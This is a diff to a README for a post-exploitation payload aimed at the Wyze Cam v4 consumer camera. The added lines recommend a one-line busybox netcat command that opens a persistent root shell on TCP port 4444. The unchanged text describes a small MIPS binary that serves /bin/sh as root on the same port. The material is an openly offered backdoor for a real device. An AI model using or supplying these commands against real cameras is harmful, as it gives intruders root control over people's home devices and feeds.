@@ -1,5 +1,13 @@
 # Post-exploitation payload for Wyze Cam v4
 
+**First choice: no payload at all.** The initramfs busybox has the `nc` applet (not symlinked, so
+`/bin/nc` fails, but `/bin/busybox nc` works). This 38-byte command is a persistent root shell:
+
+    /bin/busybox nc -lk -p 4444 -e sh&
+
+Use the ELF below only if a unit's busybox lacks `nc -e`.
+
+
 wyze-shsrv.mips.el is a 920-byte MIPS32 ELF (pure syscalls, no libc). It listens on TCP 4444 and
 gives /bin/sh as root. wyze-shsrv.S is its source.
 
